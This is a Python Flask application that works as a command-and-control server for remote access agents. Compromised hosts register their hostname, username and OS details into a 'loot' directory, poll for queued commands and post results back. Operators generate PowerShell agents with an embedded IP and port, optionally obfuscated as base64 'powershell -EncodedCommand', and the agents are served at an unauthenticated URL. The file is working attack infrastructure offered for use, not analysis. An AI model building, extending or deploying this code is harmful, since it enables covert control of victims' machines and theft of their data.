from flask import Flask, request, render_template, redirect, url_for, jsonify
from flask_login import LoginManager, UserMixin, login_user, current_user, login_required, logout_user
import psutil
import os
import datetime
import base64
import psutil

active_users = {}

app = Flask(__name__,)
app.config['SECRET_KEY'] = 'your_secret_key_here'
app.static_folder = 'static'

login_manager = LoginManager(app)
login_manager.login_view = 'login'
login_manager.login_message_category = 'info'
login_manager.init_app(app)

@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('login'))

class User(UserMixin):
    def __init__(self, id, username, password):
        self.id = id
        self.username = username
        self.password = password

    def __repr__(self):
        return f'<User {self.username}>'

users = {
    1: User(1, 'admin', 'password')
}


@login_manager.unauthorized_handler
def unauthorized_callback():
    return redirect(url_for('login'))

@login_manager.user_loader
def load_user(user_id):
    return users.get(int(user_id))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = None
        for u in users.values():
            if u.username == username and u.password == password:
                user = u
                break

        if user:
            login_user(user)
            log('Successful login {}'.format(username))
            return redirect(url_for('dashboard'))
        else:
            log('Failed login attempt {}'.format(username))

    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    log('User logged out: {}'.format(current_user.username))
    logout_user()
    return redirect(url_for('login'))

taskss = []

def log(text):
    current_time = datetime.datetime.now()
    with open("logs/logs.txt", "a") as f:
        f.write("{} - {}\n".format(text, current_time.strftime("%Y-%m-%d %H:%M:%S")))


@app.route('/')
@login_required
def index():
    return redirect(url_for('dashboard'))


@app.route("/connect", methods=["POST"])
def connect():
    data = request.get_json()
    hostname = data["hostname"]
    current_time = datetime.datetime.now()
    with open("logs/events.txt", "a") as f:
        f.write("{} - {}\n".format(request.remote_addr, current_time.strftime("%Y-%m-%d %H:%M:%S")))
    log("{} Connected From {}".format(hostname, request.remote_addr))
    if not os.path.exists("loot/" + hostname):
        os.makedirs("loot/" + hostname)
    if not os.path.exists("loot/" + hostname + "/commands"):
        os.makedirs("loot/" + hostname + "/commands")
    with open("loot/{}/data.txt".format(hostname), "w") as f:
        f.write("Ip: {}\n".format(request.remote_addr))
        f.write("Username: {}\n".format(data["username"]))
        f.write("{} {} {}".format(data["os_name"] ,data["os_version"] ,data["architecture"]))
    return "OK"


@app.route("/command/<name>", methods=["GET", "POST"])
def command(name):
    if request.method == "GET":
        clients = os.listdir("loot")
        if name in clients:
            active_users[name] = datetime.datetime.now()
            commands = os.listdir("loot/{}/commands".format(name))
            for command in commands:
                base, extension = os.path.splitext(command)
                if extension == ".todo":
                    return base
            else:
                return "No commands available", 204
        else:
            return "Client not found", 400
    else:

        return "OK"

@app.route("/command/<name>/<command>", methods=["POST", "GET"])
def accept(name, command):
    if request.method == "POST":
        clients = os.listdir("loot")
        data = request.get_data()
        if name in clients:
            files = os.listdir("loot/{}/commands".format(name))
            for file in files:
                if file == command + ".todo":
                    base, extension = os.path.splitext(command)
                    with open("loot/{}/commands/{}".format(name, command + ".todo"), "a") as f:
                        f.write(data.decode())
                    os.rename("loot/{}/commands/{}".format(name, command + ".todo"),"loot/{}/commands/{}".format(name, base + ".done"))
                    log("{} Finished {}".format(name, command))
                    return "Thanks"
        else:
            return "Client not found", 400
    else:
        @login_required
        def handle_get():
            if os.path.exists("loot/" + name):
                base, extension = os.path.splitext(command)
                if extension == ".done":
                    with open("loot/{}/commands/{}".format(name, command), "r") as f:
                        data = f.read().replace("\n", "<br>")
                        return data
            return "todo"

        if current_user.is_authenticated:
            return handle_get()

        else:
            return redirect(url_for('login'))


@app.route("/add/<name>", methods=["POST"])
@login_required
def add_command(name):
    
    username = current_user.username
    command = request.form.get("command")
    
    if os.path.exists("loot/{}/commands/{}.done".format(name, command)):
        os.remove("loot/{}/commands/{}.done".format(name, command))

    with open("loot/{}/commands/{}.todo".format(name, command), "a") as f:
        pass
    
    log('User {} added command {} for client {}'.format(username, command, name))

    return redirect(url_for('clients'))

@app.route('/active-users')
@login_required
def get_active_users():
    count = sum(1 for t in active_users.values() if (datetime.datetime.now() - t).total_seconds() <= 20)
    return str(count)

@app.route('/network-usage')
@login_required
def network_usage():
    net_io_counters = psutil.net_io_counters()
    data = {
        'bytes_sent': net_io_counters.bytes_sent,
        'bytes_recv': net_io_counters.bytes_recv
    }
    return jsonify(data)

@app.route('/cpu-usage')
@login_required
def cpu_usage():
    cpu_percent = psutil.cpu_percent()
    return jsonify(cpu_percent=cpu_percent)

@app.route('/dashboard')
@login_required
def dashboard():

    data = []
    with open("logs/events.txt", "r") as f:
        events = f.readlines()[-5:]

    with open("logs/logs.txt", "r") as f:
        logs = f.readlines()[-8:]
    data = (events, logs)
    return render_template("dashboard.html", data=data)


@app.route('/clients')
@login_required
def clients():
    clients = os.listdir("loot")
    client_data = []
    for client in clients:
        path = "loot/" + client + "/data.txt"
        with open(path, "r") as f:
            data = f.read().split("\n")
        commands = os.listdir("loot/" + client + "/commands")
        client_data.append({
            "name": client,
            "data": data,
            "commands": commands
        })
    return render_template('clients.html', clients=client_data)

@app.route("/generate_agent", methods=["POST"])
@login_required
def generate_agent():

    ip = request.form["ip"]
    port = request.form["port"]
    name = request.form["name"]
    encrypted = "encrypted" in request.form

    with open("agents/base.ps1") as f:
        base = f.read()
    
    data = base.replace("<ip>", ip).replace("<port>", port)

    agent = "agents/{}".format(name)

    if encrypted:
        contents = data

        encoded = base64.b64encode(contents.encode('UTF-16LE'))

        encoded_command = f"powershell -EncodedCommand {encoded.decode('utf-8')}"

        data = encoded_command

    with open(agent, "w") as f:
        f.write(data)
    

    return redirect(url_for('agents'))

@app.route('/agents')
@login_required
def agents():
    agents = os.listdir("agents")
    return render_template('agents.html', agents=agents)

@app.route('/a/<name>')
def view_agents(name):
    agents = os.listdir("agents")
    if name in agents:
        with open("agents/" + name, "r") as f:
            data = f.read()
        return data

@app.route('/tasks')
@login_required
def tasks():
    return render_template('tasks.html', data=taskss)

import os

@app.route('/tasks/add', methods=['POST'])
@login_required
def add_task():
    username = current_user.username

    name = request.form['name']
    action = request.form['action']
    encrypted = 'encrypted' in request.form
    active=True
    activated = request.form.getlist('activated')
    if 'all' in request.form:
        users=True
    else:
        users = request.form['users']
    if 'time_text' in request.form:
        time=request.form['time_text']
    else:
        time = ""


    log_message = 'name="{}"\naction="{}"\nactive={}\nactivated={}\nusers="{}"\ntime="{}"'.format(
        name, action, active, activated, users, time)
    
    log("User {} added task: name={}".format(username, name))

    filename = os.path.join('tasks/', name + '.txt')
    with open(filename, 'w') as f:
        f.write(log_message)

    return redirect(url_for('tasks'))



@app.route('/tasks/remove/<task>')
@login_required
def remove_task(task):

    username = current_user.username
    taskss.remove(task)

    log('User {} removed task: {}'.format(username, task))

    return redirect(url_for('tasks'))



if __name__ == '__main__':
    app.run(host="0.0.0.0")
